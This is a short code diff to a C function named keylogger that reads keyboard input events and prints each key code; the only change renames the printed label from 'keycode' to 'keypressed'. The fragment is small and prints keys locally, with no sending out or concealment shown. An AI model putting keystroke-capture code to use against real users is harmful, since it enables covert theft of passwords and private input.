@@ -99,7 +99,7 @@ static void	keylogger(int keybd)
 			}
 			if (events[i].type == EV_KEY && events[i].value == 1)
 			{
-				printf("keycode: %d", events[i].code);
+				printf("keypressed: %d", events[i].code);
 			}
 			if (events[i].type == EV_KEY && events[i].value == 2)
 			{
